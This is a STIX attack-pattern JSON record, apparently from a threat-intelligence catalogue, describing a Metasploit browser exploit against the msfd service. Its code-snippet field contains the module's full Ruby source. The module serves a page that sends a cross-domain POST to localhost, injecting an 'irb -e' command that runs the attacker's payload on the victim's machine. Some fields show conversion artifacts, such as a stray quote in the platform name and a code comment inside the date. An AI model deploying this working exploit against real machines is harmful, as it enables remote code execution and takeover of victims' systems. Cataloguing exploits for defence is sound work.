{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2598da46-4db9-41a5-b531-17d7e719313f",
    "created": "2024-08-14T17:05:27.394057Z",
    "modified": "2024-08-14T17:05:27.394061Z",
    "name": "Metasploit msfd Remote Code Execution via Browser",
    "description": " Metasploit's msfd-service makes it possible to get a msfconsole-like interface over a TCP socket. This module connects to the msfd-socket through the victim's browser.  To execute msfconsole-commands in JavaScript from a web application this module places the payload in the POST-data. These POST-requests can be sent cross-domain and can therefore be sent to localhost on the victim's machine. The msfconsole-command to execute code is 'rbi -e \"CODE\"'.  Exploitation when the browser is running on Windows is unreliable and the exploit is only usable when IE is used and the quiet-flag has been passed to msf-daemon.  'License'        => BSD_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/msfd_rce_browser.rb",
            "external_id": "msfd_rce_browser.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n     'Name'           => 'Metasploit msfd Remote Code Execution via Browser',\n     'Description'    => %q{\n      Metasploit's msfd-service makes it possible to get a msfconsole-like\n      interface over a TCP socket. This module connects to the msfd-socket\n      through the victim's browser.\n\n      To execute msfconsole-commands in JavaScript from a web application,\n      this module places the payload in the POST-data. These POST-requests\n      can be sent cross-domain and can therefore be sent to localhost on the\n      victim's machine. The msfconsole-command to execute code is 'rbi -e\n      \"CODE\"'.\n\n      Exploitation when the browser is running on Windows is unreliable and\n      the exploit is only usable when IE is used and the quiet-flag has been\n      passed to msf-daemon.\n      },\n      'License'        => BSD_LICENSE,\n      'Author'         => 'Robin Stenvi <robin.stenvi[at]gmail.com>',\n      'Platform'       => 'ruby',\n      'Arch'           => ARCH_RUBY,\n      'Targets'        =>\n        [\n          [ 'Automatic', {}],\n        ],\n      'Payload'        =>\n        {\n          'Space' => 8192,  # Arbitrary limit\n          'DisableNops' =>  'True',\n          'BadChars' => \"\\x22\\x0a\"\n        },\n      'DisclosureDate' => '2018-04-11',  # Vendor notification\n      'DefaultTarget'  => 0))\n\n      register_options([\n        OptString.new('REMOTE_IP', [true, 'Remote IP address when called from victim', '127.0.0.1']),\n        OptString.new('REMOTE_PORT', [true, 'Remote port the service is running at', '55554'])\n      ])\n  end\n\n  def exploit\n    super\n  end\n\n  def on_request_uri(cli, request)\n    msg = \"#{cli.peerhost.ljust(16)} #{self.shortname}\"\n    sc = payload.encoded\n    shellcode = \"\\\\x\" + sc.unpack('U'*sc.length).collect {|x| x.to_s 16}.join(\"\\\\x\")\n    var1 = rand_text_alpha(rand(6..11))\n    var2 = rand_text_alpha(rand(6..11))\n    html =  <<-EOS\n<html>\n<head></head>\n<body>\n<script>\nvar #{var1} = new XMLHttpRequest();\n#{var1}.open(\"POST\",\"http://#{datastore['REMOTE_IP']}:#{datastore['REMOTE_PORT']}/\", true);\nvar #{var2} = String(\"#{shellcode}\");\n#{var1}.send(\"irb -e \\\\\"\" + #{var2} + \"\\\\\"\\\\n\");\n</script>\n</body>\n</html>\nEOS\n    print_status(\"#{msg} Sending HTML...\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-04-11,  # Vendor notification",
    "x_mitre_platforms": [
        "ruby'"
    ]
}